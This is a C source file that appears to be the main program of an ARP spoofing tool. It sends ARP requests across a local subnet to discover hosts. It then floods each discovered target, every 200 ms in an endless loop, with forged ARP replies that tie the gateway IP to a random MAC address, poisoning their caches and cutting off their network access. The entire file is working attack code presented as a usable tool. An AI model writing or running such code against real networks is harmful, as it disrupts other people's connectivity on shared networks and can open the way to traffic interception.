#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/random.h>

#include "target-guard.h"

int main(int argc, char* argv[]) {
   int i;
   struct target *targets = malloc(0);
   u_int targetsLen = 0;
   
   if (argc < 2) {
      printf("Specify the network device you want to use.");
      return -1;
   }

   char *dev = argv[1];
   printf("Using interface %s", dev);

   u_int hostIp = getIpOfInterface(dev);
   printf("Host IP: "); printIP((u_char *) &hostIp); printf("\n");
   u_char hostMac[ETHER_ADDR_LEN];
   getMacOfInterface(dev, hostMac);
   printf("Host Mac: "); printMac(hostMac); printf("\n");

   struct target_guard_args args = {
      .interface = dev,
      .targets = &targets,
      .len = &targetsLen,
      .hostIp = &hostIp
   };
   pthread_t targetGuardTh;
   if (pthread_create(&targetGuardTh, NULL, startTargetGuard, &args) != 0) {
      fatal("in pthread_create()");
   }

   // Setting up target interface sockaddr
   struct sockaddr addr = { 0 };
   strncpy(addr.sa_data, dev, sizeof(addr.sa_data));

   u_char *injection = malloc(sizeof(struct eth_hdr) + sizeof(struct arp_hdr)); // Injection ARP packet
   struct eth_hdr *inEth = (struct eth_hdr*) injection;
   struct arp_hdr *inArp = (struct arp_hdr*) (inEth + 1);

   write_arp_base(injection, ARP_REQUEST);
   // Ethernet header setup
   memcpy(inEth->ether_src_addr, hostMac, ETHER_ADDR_LEN);
   memset(inEth->ether_dest_addr, 0xFF, ETHER_ADDR_LEN);
   // Arp header setup
   memcpy(inArp->src_hw_addr, hostMac, ETHER_ADDR_LEN);
   memcpy(inArp->src_proto_addr, &hostIp, 4);
   memset(inArp->target_hw_addr, 0, ETHER_ADDR_LEN);
   memcpy(inArp->target_proto_addr, &hostIp, 4 - 1); // The last bit will be set accordingly in the send loop

   // printf("Base ARP Request packet:\n");
   // print_arp_packet(injection);

   usleep(200000); // Waiting for the targetGuard to be ready

   int so = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
   if (so == -1) {
      fatal("socket()");
   }

   printf("Sending ARP Request to every potential IP on the network...\n");

   for (i = 2; i < 0xFE; i++) {
      if (i == ((u_char *) &hostIp)[3]) {
         continue;
      }

      (inArp->target_proto_addr)[3] = i;

      int bytes = sendto(so, injection, 42, 0, &addr, sizeof(struct sockaddr_ll));
      if (bytes == -1)
         fatal("sendto()");

      // printf("Sent %d bytes...\n", bytes);
   }

   // Flodding targets with misleading ARP Replies
   int sendInterval = 200; // Packets are sent at this interval in ms
   inArp->operation = htons(ARP_REPLY);
   getrandom(inArp->src_hw_addr, ETHER_ADDR_LEN, 0);
   memcpy(inArp->src_proto_addr, &hostIp, 4 - 1);
   (inArp->src_proto_addr)[3] = 1; // Gateway IP

   printf("Flooding the targets with misleading ARP packets...");

   while (1) {
      struct target *target = targets;

      for (i = 0; i < targetsLen; i++, target++) {
         memcpy(inEth->ether_dest_addr, target->mac, ETHER_ADDR_LEN);
         memcpy(inArp->target_hw_addr, target->mac, ETHER_ADDR_LEN);
         memcpy(inArp->target_proto_addr, target->ip, 4);

      int bytes = sendto(so, injection, 42, 0, &addr, sizeof(struct sockaddr_ll));
      if (bytes == -1)
         fatal("sendto()");
      }

      usleep(sendInterval * 1000); // Sleep for x ms
   } 

   close(so);
   pthread_join(targetGuardTh, NULL);

   return 0;
}
